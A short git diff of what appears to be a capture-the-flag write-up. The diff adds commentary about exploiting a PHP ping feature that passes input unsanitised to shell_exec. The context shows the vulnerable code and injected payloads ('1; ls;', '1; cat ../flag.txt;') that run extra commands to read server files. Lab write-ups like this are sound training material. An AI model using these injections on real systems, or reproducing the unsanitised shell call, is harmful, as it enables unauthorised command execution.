@@ -20,6 +20,7 @@ public function getOutput()
         return shell_exec('ping -c 3 '.$this->ip);
     }
 ```
+With that I know I can do some remote execution.
 
 ## Payload
 I check out the Command feature and try to add another command at the end.
@@ -33,7 +34,7 @@ static
 views
 > /ping 1; ls;
 ```
-and it works!
+and it works! I was able to see the files in the current directory on the server.
 
 All it took from there was
 `/ping 1; cat ../flag.txt;`
